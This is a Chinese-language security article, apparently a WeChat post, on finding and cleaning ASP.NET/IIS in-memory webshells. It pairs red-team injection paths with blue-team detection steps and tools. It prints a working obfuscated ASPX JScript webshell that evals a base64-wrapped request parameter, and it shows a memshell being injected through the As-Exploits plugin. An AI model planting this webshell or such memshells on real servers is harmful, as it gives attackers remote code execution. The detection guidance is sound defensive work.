---
title: ASP.NET / IIS 内存马如何排查？
url: https://mp.weixin.qq.com/s/M35l1FsTbC-JRm4zqEly4g
source: Doonsec's feed
date: 2026-11-13
fetch_date: 2026-11-14T08:17:10.661846
---

# ASP.NET / IIS 内存马如何排查？

# ASP.NET / IIS 内存马如何排查？

原创

一个努力的学渣
一个努力的学渣

一个努力的学渣

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

TICKET REVIEWADMIT ONE

ASP.NET / IIS 内存马如何排查？

导读 · CONTENTS

01前景回顾--ASP.NET / IIS 内存马分类

02ASP.NET / IIS 内存马上传路径

03ASP.NET / IIS 内存马上传方式以及部分工具

04 清理查杀

⚠️ 免责声明：本文所涉技术与工具仅限授权环境下的安全排查与防御研究。请勿用于非法用途。在生产环境执行任何动态 Attach、内存 Dump 或卸载操作前，务必做好证据保全与回滚准备。

01

前景回顾--ASP.NET / IIS 内存马分类

ASP

第一类：应用管线层

这类内存马通常寄生在正常的请求处理流程中，伪装成正常的业务组件。

| 观察对象 | 可能的表现 | 排查方向（专业版） | 排查方向（小白版：怎么查+看什么） |
| --- | --- | --- | --- |
| \*\*VirtualPathProvider\*\* | 通过虚拟路径提供不落地的页面或资源 | 检查注册链、Provider类型、来源程序集、虚拟路径和实际响应 | 访问虚拟路径，如果发现访问一个磁盘上根本不存在的文件，却返回了内容，就是马。 |
| \*\*ASP.NET MVC Filter\*\* | 在请求执行过程中拦截或修改行为 | 检查全局Filter、Controller/Action Filter列表和执行逻辑 | 用 `dnSpy` 查过滤器列表，如果发现没见过的类在偷偷拦截并篡改请求，就是马。 |
| \*\*Route / Router\*\* | 动态增加路由映射，使不存在于磁盘的路径被应用识别 | 比较 RouteTable 与正常路由基线，核对 RouteHandler 和代码来源 | 对比开发给的路由清单，如果系统里多出奇怪路由且指向未知 Handler，就是马。 |
| \*\*HttpModule\*\* | 在请求管线事件（如 BeginRequest）中注册，拦截全局请求 | 检查 `HttpApplication` 事件管线的模块注册列表与 `Init` 方法 | 看模块列表，如果发现陌生的 `IHttpModule` 在非初始化阶段被注册并拦截请求，就是马。 |
| \*\*HttpHandler\*\* | 劫持特定后缀或路径的处理程序，直接接管请求 | 对比 `web.config` 中的 `<handlers>` 配置与实际运行状态 | 对比 `web.config`，如果磁盘没对应的文件，内存中却有活跃的 Handler 在处理请求，就是马。 |
| \*\*WebSocket 接管\*\* | 在 HTTP 升级握手阶段注入，用 WS 通道下发指令 | 检查 HTTP -> WebSocket 升级握手请求与子协议（如 msh）标记 | 用 `netstat` 看连接，如果业务本不该有 WebSocket，却出现了异常长连接，高度可疑。 |
| \*\*Remoting URI 注册\*\* | 向已存在的 Remoting 通道注册恶意端点，形成独立入口 | 监控 Remoting 通道的全局 URI 表，排查非预期的 URI 端点 | 查全局 URI 表，如果发现陌生的、不符合命名规范的远程调用端点被注册，就是马。 |
| \*\*编译缓存\*\* | 恶意代码在运行时被编译并缓存，痕迹可能比磁盘更持久 | 检查 `Temporary ASP.NET Files` 目录下的编译产物与源文件对应关系 | 去 Temp 目录看缓存，如果发现有对不上源码的 `.cs` 或 `.dll` 文件，就是马。 |

第二类：底层程序集与运行时层

这类内存马不依赖固定的请求组件，而是直接在内存中动态加载或修改代码。

| 观察对象 | 可能的表现 | 排查方向（专业版） | 排查方向（小白版：怎么查+看什么） |
| --- | --- | --- | --- |
| \*\*动态 Assembly\*\* | 运行时生成或加载程序集（无物理 DLL 落地） | 检查 Assembly 是否动态、Location / CodeBase、模块地址和反编译内容 | 用 dnSpy 看模块列表，如果某个 DLL 没有磁盘路径（Location为空/未知）却能运行，高度可疑。 |
| \*\*ASP.NET Core 中间件\*\* | 在 Core 环境下，向 DI 容器或请求管道注入恶意中间件 | 核查 `Startup.Configure` 服务注册与中间件管线顺序 | 查 DI 容器和管道，发现源码里根本没写，却生效的自定义中间件，就是马。 |
| \*\*IIS 原生模块\*\* | 以原生 DLL 形式注册到 IIS，拥有极高权限，脱离托管代码 | 使用 `appcmd list modules` 排查未知的 Native Module 及其签名 | 用 appcmd 查模块，发现未知的本地 DLL 模块被注册到 IIS 里，查其来源，不明即马。 |

第三类：独立监听层

这类内存马完全脱离 IIS 的请求处理管线，直接自建服务。

| 观察对象 | 可能的表现 | 排查方向（专业版） | 排查方向（小白版：怎么查+看什么） |
| --- | --- | --- | --- |
| \*\*HttpListener\*\* | 在 w3wp.exe 进程内自建 HTTP 监听器，不产生 IIS 日志 | 排查目标进程开放的端口，检查 URL ACL 权限及非预期监听 | 用 netstat 查端口，如果 w3wp.exe 监听了非 IIS 绑定的奇怪端口，且无日志，就是马。 |

02

ASP.NET / IIS 内存马上传路径

ASP

在ASP.NET/IIS的攻防中，很多人对内存马的理解还停留在“传一个 .aspx 文件，用完之后再删掉”的层面。

其实，真正高级的ASP.NET内存马，根本不需要在硬盘上留下任何可执行文件。攻击者利用的是.NET强大的反射机制和IIS的底层管道。

今天，我们就从红队（攻击）和蓝队（防守）双重视角，拆解一下ASP.NET内存马到底是怎么植入的，以及我们该怎么查。

💡 破除误区：“上传”的不一定是文件

在 IIS 环境中，“上传”内存马有两种含义：

POINT 1**传文件**：传一个跳板（WebShell）上去，用它把内存马加载进内存。

POINT 2**传代码**：通过请求（POST 数据），把恶意代码直接“送”进w3wp.exe 进程里执行。

根据入口的不同，大致分为 4 种主流的植入路径：

🟢 路径一：直捣黄龙（利用漏洞直接注入）

🔴 红队：怎么打？

黑客连跳板都不需要。最经典的是 ViewState 反序列化。如果黑客拿到了网站的 MachineKey，就能伪造一个恶意的 \_\_VIEWSTATE 请求发给服务器。服务器一解析，直接就在内存中执行了黑客的代码。

此外，利用 RadAsyncUpload 等组件的反序列化漏洞（如 CVE-2019-18935），也能直接把恶意 DLL 打进内存。

🔵 蓝队：怎么查？

• 查日志特征：重点盯防 POST 请求中 \_\_VIEWSTATE 参数异常巨大、明显像是一长串加密代码的请求。

• 查配置：排查你的 web.config 或机器密钥是否泄露，或者是否被关闭了 MAC 校验（enableViewStateMac="false"）。

🟡 路径二：偷梁换柱（通过 WebShell 二次植入）

🔴 红队：怎么打？

  这是实战中最常见的套路。黑客先传一个普通的 .aspx 木马上去，用哥斯拉或冰蝎连上。然后通过这个木马发一段指令，调用 .NET 的 Assembly.Load(byte[]) 方法，把一段恶意的 DLL 字节码直接加载进内存运行。运行成功后，顺手把最初的 .aspx 文件删了。

🔵 蓝队：怎么查？

• 查内存模块：用 dnSpy 附加到 w3wp.exe 进程，看模块列表。如果发现某个 DLL 的 Location（物理路径）是空的，或者显示 <Unknown>，那就是通过反射加载的内存马。

• 查编译缓存：去 C:\Windows\Microsoft.NET\Framework\...\Temporary ASP.NET Files\ 目录下看看有没有残留的可疑文件。

🔴 路径三：暗度陈仓（动态编译与组件注册）

🔴 红队：怎么打？

  代码进内存后，得找个“工位”才能持续工作：

• VPP（虚拟路径）：黑客在内存注册一个 VirtualPathProvider。这就相当于凭空捏造了一个 /shell.aspx，你访问这个 URL，磁盘上啥都没有，但内存里会返回黑客的内容。

• HttpModule 注入：把一个恶意的 HttpModule 挂载到请求管道上，从此所有流量都要经过这个“黑保安”的眼线。

🔵 蓝队：怎么查？

• 日志与磁盘做差集：从 IIS 日志里提取被请求的 URL，去磁盘上找。请求过但磁盘上不存在的路径，大概率是 VPP。

• 查运行时组件：用探测脚本或工具，看看当前进程里的 HttpModule、Filter 列表里，有没有陌生的面孔。

⚫ 路径四：地下通道（底层模块与独立监听）

🔴 红队：怎么打？

• 原生模块注入：黑客用 appcmd.exe 向 IIS 注册一个恶意的 C++ DLL。这个 DLL 会随 w3wp.exe 启动，权限极高。

• 自建 HttpListener：黑客直接在 w3wp.exe 里启动一个监听器，开个新端口（比如8080）当后门。IIS 日志里连个影儿都抓不到。

🔵 蓝队：怎么查？

• 查 IIS 模块：运行 appcmd list modules，对比正常基线。看看有没有指向非系统目录、无数字签名的可疑 DLL。

• 查端口监听：运行 netstat -ano，看看 w3wp.exe 进程有没有监听 80/443 之外的非业务端口。

🔵 蓝队防守速查表

面对 ASP.NET 内存马，“看文件”是最低级的排查。真正的防守，是对照着黑客的攻击路径，进行降维打击：

| 植入路径 | 🔴 红队核心动作 | 🔵 蓝队核心排查点 |
| --- | --- | --- |
| \*\*ViewState 反序列化\*\* | 伪造恶意的 `\_\_VIEWSTATE` 参数 | 查日志里的超大 POST 参数；确认 MachineKey 和 MAC 校验状态 |
| \*\*内存反射加载\*\* | 用 `Assembly.Load` 加载无文件 DLL | 用 dnSpy 查 `Location` 为空的程序集；查临时缓存目录 |
| \*\*VPP / 组件注册\*\* | 动态注册虚拟路径或恶意 HttpModule | 查日志里“磁盘不存在但返回200”的路径；核对组件注册表 |
| \*\*底层模块 / 监听\*\* | 注册原生 DLL 或开启独立端口监听 | `appcmd list modules` 查异常模块；`netstat` 查异常端口 |

**总结一句话**：内存马虽然不落地，但只要它加载了代码、注册了组件、或者开启了端口，就一定会留下运行时痕迹。别光盯着硬盘，多看看进程、内存和日志，才是蓝队进阶的必经之路。

03

ASP.NET / IIS 内存马上传方式以及部分工具

TOOLS

WebShell 二次植入

首先呢，这里把ASPX木马文件上传至目标服务器，之后测试连接（至于植入方法这里就不演示了）

蚁剑插件：https://github.com/yzddmr6/As-Exploits

支持类型：php/jsp/jspjs/aspx/aspxcsharp

注意：如果上传的是ASP脚本，此插件是灰色的，无法使用，必须上传ASPX脚本

ASP脚本

![](https://mmbiz.qpic.cn/mmbiz_png/qkajCoyKpkAxCv6cshAyhlNTvz0sDRskaiabSZoXQ9cTOAiaCcIQZDRW3AlEyW32edTwHSkSiaA9oykoic32RVj1ra3aP3b8dibjpdt6pb89jiaXY/640?wx_fmt=png&from=appmsg)

ASPX脚本

上传的ASPX脚本：

<scriptrunat="server"language="JScript">
functionpopup(str) {
    var q = "u";
    var w = "afe";
    var a = q + "ns" + w;
    var b= eval(str,a);
    return(b);
}
</script>
<%
popup(popup(System.Text.Encoding.GetEncoding(65001).
GetString(System.Convert.FromBase64String("UmVxdWVzdC5JdGVtWyJ6Il0="))));
%>

![](https://mmbiz.qpic.cn/sz_mmbiz_png/qkajCoyKpkB9pV0rQPKE5GYAhurREp0JJB3iaTnYmpdiaWiae2hBzg9p5IcQM1MbZz4uBEA9gpLAFfzk8ovIMaK3oaWDUuW5jIydDwxDB3qa6U/640?wx_fmt=png&from=appmsg)

测试连接

![](https://mmbiz.qpic.cn/sz_mmbiz_png/qkajCoyKpkALt3iaP07jEIvB2FKGcbWspBsmDywwp9YOQibl7snM4vMSEsu1o9NeNdia2yYMJX1uat2UcRwicF25iaPob9gXpQck77OOIicQ0SkPE/640?wx_fmt=png&from=appmsg)

使用工具连接

![](https://mmbiz.qpic.cn/sz_mmbiz_png/qkajCoyKpkCM8yiaQAmtcdMmqfbvrf5SCpx6JoXRZfXvlJuib2ewibXEBskRqNlyEGicrcMVEN58wysReKgOWia0FF4rwdKFSfU5jt0OlpK0hyibY/640?wx_fmt=png&from=appmsg)

内存马注入

![](https://mmbiz.qpic.cn/sz_mmbiz_png/qkajCoyKpkB2r1yfIyh7OEK73nQFE6rbLNaJUJhuFNZ4ShfIb5p1fPjFR1YxVSjMVz8hncugjic2DueDa5b6af2wI5sLVicGfPGcwLoRFFia2k/640?wx_fmt=png&from=appmsg)

内存马注入成功

![](https://mmbiz.qpic.cn/sz_mmbiz_png/qkajCoyKpkDuibtUMge3kPiaotUFicQ9adTXzC5U4kYDv1F455URtmpDCkJRWkWxukR50eOZAkJDfoBN4TRm42GCfY378GzCCroJLrFrymeLtc/640?wx_fmt=png&from=appmsg)

查看内存马查看内存马

![](https://mmbiz.qpic.cn/sz_mmbiz_png/qkajCoyKpkDCYLHp32h2Lobx2ibugOeuJno0IRLxUGEoceo9MTcywfo6oBIicQeOvRw06dyVu0S451KySnnibur4knHiaEufNyZsQznD0tLNzBs/640?wx_fmt=png&from=appmsg)

测试内存马连接

As-Exploits插件

此工具除了注入内存马，也支持查看内存马

ASP.net内存马监测工具--ASP.NET-Memshell-Scanner

项目地址：https://github.com/yzddmr6/ASP.NET-Memshell-Scanner

使用方法：直接把aspx-memshell-scanner.aspx脚本放到服务器的web目录，浏览器访问即可。

**支持的类型：**

POINT 1VirtualPath内存马

POINT 2ASP.NET MVC Filter内存马

POINT 3Router内存马

![](https://mmbiz.qpic.cn/sz_mmbiz_png/qkajCoyKpkCsjOVGgxydFbtW9Y8ZNmzTJdSiaiaKV8m2a6ZvaXLpdB2TMnkkBZebic76gJTjqqDkXywcYlfaR7vQ0zNsSpV2lHYhj9kKgspLpk/640?wx_fmt=png&from=appmsg)

查看内存马

成功查出来内存马

小技巧

如果下载下来的文件传到服务器之后报错，可以直接在GitHub上把脚本内容复制出来然后再创建个aspx文件就不会报错了。

生产使用的安全要求

检测页面一旦放入站点，就成为一个新的 Web 入口。必须使用可信版本、限制访问来源、选择受控时间窗口、保存原始文件哈希，并在完成后删除检测页面、复扫目录和审计访问日志。不要让检测脚本长期留在公网 Web 根目录。

微软自带工具--procdump

下载地址：learn.microsoft.com/zh-cn/sysinternals/downloads/procdump

cdC:\Windows\System32\inetsrv
appcmdlist wp#提取网站PID，这里需要注意，如果结果为空，访问下网站，再执行此命令

![](https://mmbiz.qpic.cn/sz_mmbiz_png/qkajCoyKpkDeFCf4TLrYETjjw9Hiagvr5qhSLCG5BIibZH3BZJNANBFdRGzfia4adPbZlHhH7e6QhHh3uaHxV5kmCzsnMxwlGaIlnpr8w56AOM/640?wx_fmt=png&from=appmsg)

提取网站PID

procudmp.exe-ma 3624C:\Users\Administrator\Desktop\w3wp\_FullDump.dmp

![](https://mmbiz.qpic.cn/mmbiz_png/qkajCoyKpkBbMXjcMsx9621ZCib7VtUDwmIMuibpt3lGHMib0XyU5UojxicQ3SjbRozluWRicibbT7cREwsHAF9mcFt0ibicfnJTpmueiaJ3bAy1JITg...